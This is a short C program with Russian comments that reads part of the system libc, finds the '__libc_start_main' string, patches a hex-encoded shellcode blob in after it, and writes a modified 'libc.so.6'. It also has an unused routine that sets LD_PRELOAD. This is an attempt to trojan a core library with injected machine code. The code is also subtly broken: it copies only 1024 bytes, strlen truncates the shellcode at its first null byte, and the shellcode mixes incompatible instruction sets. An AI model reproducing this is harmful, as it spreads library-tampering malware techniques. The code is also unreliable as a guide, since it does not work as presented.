#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"

void set_context(void) {
    // Здесь мы не можем напрямую установить контекст,
    // но мы можем использовать переменные окружения
    setenv("LD_PRELOAD", LIBC_PATH, 1);
}

int main() {
    FILE *file;
    char buffer[1024];
    
    // Открытие файла libc
    file = fopen(LIBC_PATH, "rb");
    if (!file) {
        fprintf(stderr, "Ошибка при открытии файла %s\n", LIBC_PATH);
        return 1;
    }

    // Чтение содержимого файла
    size_t bytes_read = fread(buffer, 1, sizeof(buffer), file);
    fclose(file);

    // Генерация ассемблированного кода
    const char* assembly_code = 
        "\x48\x31\xc0\x48\x31\xeb\x53\x54\x5f\xb8\x01\x00\x00\x00\xbb\x03\x00\x00\x00\xcd\x80\x31\xc0\x50\x05\x52\x57\x48\x31\xf6\x06\x00\x00\x00\x01\x00\x00\x00\xbb\x02\x00\x00\x00\xcd\x80\x31\xc0\x50\x05\x52\x57\x48\x31\xf6\x06\x00\x00\x00\x01\x00\x00\x00\xbb\x03\x00\x00\x00\xcd\x80";

    // Нахождение индекса __libc_start_main
    const char* lib_start_main = "__libc_start_main";
    size_t lib_start_main_len = strlen(lib_start_main);
    size_t index = -1;
    for (size_t i = 0; i <= bytes_read - lib_start_main_len; i++) {
        if (memcmp(&buffer[i], lib_start_main, lib_start_main_len) == 0) {
            index = i;
            break;
        }
    }

    if (index == -1) {
        fprintf(stderr, "Не удалось найти __libc_start_main\n");
        return 1;
    }

    // Замена части данных на ассемблированный код
    memcpy(&buffer[index + 16], assembly_code, strlen(assembly_code));

    // Создание нового файла
    file = fopen("./libc.so.6", "w+b");
    if (!file) {
        fprintf(stderr, "Ошибка при создании файла ./libc.so.6\n");
        return 1;
    }

    // Запись модифицированного libc в новый файл
    fwrite(buffer, 1, bytes_read, file);
    fclose(file);

    printf("Модифицированный libc успешно создан\n");

    return 0;
}
